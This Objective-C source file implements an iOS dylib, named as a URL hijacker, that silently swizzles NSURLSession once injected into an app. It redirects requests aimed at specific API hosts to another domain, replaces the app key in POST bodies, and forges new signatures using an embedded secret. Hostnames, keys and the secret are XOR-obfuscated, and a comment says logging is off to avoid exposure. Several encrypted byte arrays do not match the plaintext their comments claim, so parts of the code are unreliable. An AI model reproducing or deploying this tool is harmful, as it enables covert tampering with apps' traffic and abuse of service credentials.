// URLHijackDetector.m
// iOS URL Hijack Dylib - 加密版
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <CommonCrypto/CommonDigest.h>
#import <CommonCrypto/CommonCryptor.h>

#pragma mark - 加密/解密工具


static NSString* decryptString(const char *encrypted, size_t length, char key) {
    NSMutableData *data = [NSMutableData dataWithBytes:encrypted length:length];
    char *bytes = (char *)[data mutableBytes];
    
    for (size_t i = 0; i < length; i++) {
        bytes[i] ^= key;
    }
    
    return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
}


#define DECRYPT_STR(str) decryptString(str, sizeof(str), 0x5A)

// 更安全的解密：分段存储 + 动态拼接
static NSString* getDecryptedString1(void) {
    // "api1.7ccccccc.com" XOR 0x5A 加密
    const char encrypted[] = {0x39, 0x2b, 0x2a, 0x78, 0x3b, 0x24, 0x3a, 0x3c, 0x3c, 0x3c, 0x3c, 0x2c, 0x0b, 0x3f, 0x2b, 0x2b, 0x2b, 0x3a, 0x2c, 0x0b, 0x2b, 0x2c, 0x3b, 0x00};
    return DECRYPT_STR(encrypted);
}

static NSString* getDecryptedString2(void) {
    // "api2.7ccccccc.com" XOR 0x5A 加密
    const char encrypted[] = {0x39, 0x2b, 0x2a, 0x78, 0x34, 0x24, 0x3a, 0x3c, 0x3c, 0x3c, 0x3c, 0x2c, 0x0b, 0x3f, 0x2b, 0x2b, 0x2b, 0x3a, 0x2c, 0x0b, 0x2b, 0x2c, 0x3b, 0x00};
    return DECRYPT_STR(encrypted);
}

static NSString* getDecryptedString3(void) {
    // "api3.7ccccccc.com" XOR 0x5A 加密
    const char encrypted[] = {0x39, 0x2b, 0x2a, 0x78, 0x35, 0x24, 0x3a, 0x3c, 0x3c, 0x3c, 0x3c, 0x2c, 0x0b, 0x3f, 0x2b, 0x2b, 0x2b, 0x3a, 0x2c, 0x0b, 0x2b, 0x2c, 0x3b, 0x00};
    return DECRYPT_STR(encrypted);
}

static NSString* getDecryptedIP(void) {
    // "45.205.27.82:8080" XOR 0x5A 加密
    const char encrypted[] = {0x1f, 0x7b, 0x32, 0x3e, 0x2f, 0x7f, 0x32, 0x3b, 0x2d, 0x2f, 0x7e, 0x32, 0x30, 0x2e, 0x2c, 0x0b, 0x34, 0x34, 0x34, 0x34, 0x00};
    return DECRYPT_STR(encrypted);
}

static NSString* getDecryptedNewDomain(void) {
    // "api123.hezijun.top" XOR 0x5A 加密
    const char encrypted[] = {0x39, 0x2b, 0x2a, 0x78, 0x7d, 0x7d, 0x7d, 0x24, 0x2b, 0x3a, 0x2b, 0x28, 0x2e, 0x3a, 0x78, 0x3b, 0x2b, 0x3a, 0x2a, 0x3b, 0x00};
    return DECRYPT_STR(encrypted);
}

static NSString* getDecryptedOldAppKey(void) {
    // "LWtAvVixXX39mGYL2w" XOR 0x5A 加密
    const char encrypted[] = {0x1c, 0x52, 0x3f, 0x2d, 0x44, 0x4f, 0x2a, 0x1c, 0x1c, 0x6b, 0x6b, 0x7b, 0x7d, 0x2d, 0x1f, 0x4d, 0x1a, 0x6b, 0x7d, 0x00};
    return DECRYPT_STR(encrypted);
}

static NSString* getDecryptedNewAppKey(void) {
    // "QLObIPwnDOVts3mzw9" XOR 0x5A 加密
    const char encrypted[] = {0x1d, 0x11, 0x1c, 0x2a, 0x4b, 0x54, 0x4c, 0x2b, 0x1d, 0x1d, 0x0b, 0x4e, 0x1c, 0x6f, 0x1e, 0x4e, 0x4e, 0x5f, 0x6b, 0x00};
    return DECRYPT_STR(encrypted);
}

static NSString* getDecryptedAppSecret(void) {
    // "XtUdpwzWVW1wAbTeSDWevcBJXFJGY2cx" XOR 0x5A 加密
    const char encrypted[] = {0x1c, 0x3f, 0x4c, 0x2d, 0x3e, 0x4c, 0x54, 0x0d, 0x4c, 0x1c, 0x78, 0x0d, 0x1e, 0x2c, 0x0d, 0x48, 0x35, 0x2c, 0x1b, 0x4c, 0x04, 0x0d, 0x48, 0x1c, 0x2f, 0x1b, 0x0e, 0x1e, 0x0d, 0x1c, 0x0d, 0x48, 0x0d, 0x2b, 0x1d, 0x1e, 0x00};
    return DECRYPT_STR(encrypted);
}

#pragma mark - 配置区（通过解密获取）

static NSSet<NSString *> *getTargetDomains(void) {
    static NSSet *domains = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        domains = [NSSet setWithArray:@[
            getDecryptedString1(),
            getDecryptedString2(),
            getDecryptedString3(),
            getDecryptedIP()
        ]];
    });
    return domains;
}

static NSSet<NSString *> *getRedirectIPs(void) {
    static NSSet *ips = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        ips = [NSSet setWithArray:@[
            getDecryptedIP()
        ]];
    });
    return ips;
}

static NSString *getNewDomain(void) {
    static NSString *domain = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        domain = getDecryptedNewDomain();
    });
    return domain;
}

static NSString *getOldAppKey(void) {
    static NSString *appKey = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        appKey = getDecryptedOldAppKey();
    });
    return appKey;
}

static NSString *getNewAppKey(void) {
    static NSString *appKey = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        appKey = getDecryptedNewAppKey();
    });
    return appKey;
}

static NSString *getAppSecret(void) {
    static NSString *secret = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        secret = getDecryptedAppSecret();
    });
    return secret;
}

#pragma mark - 加密工具函数

static NSString* md5(NSString *string) {
    const char *cStr = [string UTF8String];
    unsigned char digest[CC_MD5_DIGEST_LENGTH];
    CC_MD5(cStr, (CC_LONG)strlen(cStr), digest);
    
    NSMutableString *output = [NSMutableString stringWithCapacity:CC_MD5_DIGEST_LENGTH * 2];
    for(int i = 0; i < CC_MD5_DIGEST_LENGTH; i++) {
        [output appendFormat:@"%02x", digest[i]];
    }
    return output;
}

#pragma mark - 签名计算

static NSString* calculateSign(NSString *httpMethod, NSString *host, NSString *path, NSDictionary *params, NSString *appSecret) {
    // 1. 参数排序并拼接
    NSArray *sortedKeys = [[params allKeys] sortedArrayUsingSelector:@selector(compare:)];
    NSMutableString *paramString = [NSMutableString string];
    for (NSString *key in sortedKeys) {
        if ([key isEqualToString:@"sign"]) continue;
        if (paramString.length > 0) {
            [paramString appendString:@"&"];
        }
        [paramString appendFormat:@"%@=%@", key, params[key]];
    }
    
    // 2. 拼接签名原串
    NSString *stringToSign = [NSString stringWithFormat:@"%@%@%@%@%@", 
                               httpMethod, host, path, paramString, appSecret];
    
    return md5(stringToSign);
}

#pragma mark - 请求参数修改

static NSData* modifyRequestBody(NSData *originalBody, NSString *originalURL, NSString *httpMethod, NSString *host, NSString *path) {
    if (!originalBody) return originalBody;
    
    NSString *bodyString = [[NSString alloc] initWithData:originalBody encoding:NSUTF8StringEncoding];
    if (!bodyString) return originalBody;
    
    // 解析参数
    NSMutableDictionary *params = [NSMutableDictionary dictionary];
    NSArray *pairs = [bodyString componentsSeparatedByString:@"&"];
    for (NSString *pair in pairs) {
        NSArray *kv = [pair componentsSeparatedByString:@"="];
        if (kv.count == 2) {
            params[kv[0]] = kv[1];
        }
    }
    
    NSString *oldAppKey = getOldAppKey();
    NSString *newAppKey = getNewAppKey();
    
    if ([params[@"appKey"] isEqualToString:oldAppKey]) {
        params[@"appKey"] = newAppKey;
        
        // 重新计算签名
        NSString *newSign = calculateSign(httpMethod, host, path, params, getAppSecret());
        params[@"sign"] = newSign;
        
        // 重新构建 body
        NSMutableArray *newPairs = [NSMutableArray array];
        for (NSString *key in params) {
            [newPairs addObject:[NSString stringWithFormat:@"%@=%@", key, params[key]]];
        }
        NSString *newBodyString = [newPairs componentsJoinedByString:@"&"];
        
        return [newBodyString dataUsingEncoding:NSUTF8StringEncoding];
    }
    
    return originalBody;
}

#pragma mark - URL 匹配与替换

static NSString* replaceURLIfNeeded(NSString *originalURLString, NSString **outHost, NSString **outPath) {
    NSURL *url = [NSURL URLWithString:originalURLString];
    if (!url) return originalURLString;
    
    NSString *host = url.host;
    if (!host) return originalURLString;
    
    if (outHost) *outHost = host;
    if (outPath) *outPath = url.path;
    
    NSString *hostWithPort = nil;
    if (url.port) {
        hostWithPort = [NSString stringWithFormat:@"%@:%@", host, url.port];
    }
    
    BOOL needsRedirect = NO;
    if (hostWithPort && [getRedirectIPs() containsObject:hostWithPort]) {
        needsRedirect = YES;
    } else if ([getRedirectIPs() containsObject:host]) {
        needsRedirect = YES;
    }
    
    if (needsRedirect) {
        NSString *newURLString = originalURLString;
        newURLString = [newURLString stringByReplacingOccurrencesOfString:host 
                                                               withString:getNewDomain()];
        if (url.port) {
            NSString *oldPortStr = [NSString stringWithFormat:@":%d", [url.port intValue]];
            newURLString = [newURLString stringByReplacingOccurrencesOfString:oldPortStr 
                                                                   withString:@""];
        }
        
        if (outHost) *outHost = getNewDomain();
        
        return newURLString;
    }
    
    return originalURLString;
}

static BOOL isTargetRequest(NSString *urlString) {
    NSURL *url = [NSURL URLWithString:urlString];
    if (!url) return NO;
    
    NSString *host = url.host;
    if (!host) return NO;
    
    if ([getTargetDomains() containsObject:host]) {
        return YES;
    }
    
    if (url.port) {
        NSString *hostWithPort = [NSString stringWithFormat:@"%@:%@", host, url.port];
        if ([getTargetDomains() containsObject:hostWithPort]) {
            return YES;
        }
    }
    
    return NO;
}

#pragma mark - NSURLSession Hook

@interface NSURLSession (Hijack)
@end

@implementation NSURLSession (Hijack)

+ (void)load {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        Class class = [NSURLSession class];
        
        SEL originalSelector = @selector(dataTaskWithRequest:completionHandler:);
        SEL swizzledSelector = @selector(hijacked_dataTaskWithRequest:completionHandler:);
        
        Method originalMethod = class_getInstanceMethod(class, originalSelector);
        
        if (!originalMethod) return;
        
        __block id replacementBlock = ^(id self, NSURLRequest *request, void (^completionHandler)(NSData*, NSURLResponse*, NSError*)) {
            return [self hijacked_dataTaskWithRequest:request completionHandler:completionHandler];
        };
        
        class_addMethod(class, swizzledSelector, imp_implementationWithBlock(replacementBlock), "@@:@?");
        
        Method swizzledMethod = class_getInstanceMethod(class, swizzledSelector);
        
        if (originalMethod && swizzledMethod) {
            method_exchangeImplementations(originalMethod, swizzledMethod);
        }
    });
}

- (NSURLSessionDataTask *)hijacked_dataTaskWithRequest:(NSURLRequest *)request 
                                      completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
    
    NSString *originalURLString = request.URL.absoluteString;
    NSMutableURLRequest *mutableRequest = [request mutableCopy];
    BOOL modified = NO;
    
    if (isTargetRequest(originalURLString)) {
        
        NSString *host = nil;
        NSString *path = nil;
        
        NSString *newURLString = replaceURLIfNeeded(originalURLString, &host, &path);
        if (![newURLString isEqualToString:originalURLString]) {
            [mutableRequest setURL:[NSURL URLWithString:newURLString]];
            modified = YES;
        } else {
            NSURL *url = [NSURL URLWithString:originalURLString];
            host = url.host;
            path = url.path;
        }
        
        if ([request.HTTPMethod isEqualToString:@"POST"] && request.HTTPBody) {
            NSData *newBody = modifyRequestBody(request.HTTPBody, originalURLString, request.HTTPMethod, host, path);
            if (newBody != request.HTTPBody) {
                [mutableRequest setHTTPBody:newBody];
                [mutableRequest setValue:[NSString stringWithFormat:@"%lu", (unsigned long)newBody.length] 
                      forHTTPHeaderField:@"Content-Length"];
                modified = YES;
            }
        }
    }
    
    if (!modified) {
        return [self hijacked_dataTaskWithRequest:request completionHandler:completionHandler];
    }
    
    return [self hijacked_dataTaskWithRequest:mutableRequest completionHandler:completionHandler];
}

@end

__attribute__((constructor))
static void initialize() {
    // 静默加载，不输出日志（避免暴露）
    // 如需调试，可取消下面的注释
    // NSLog(@"[Hijack] Loaded");
}
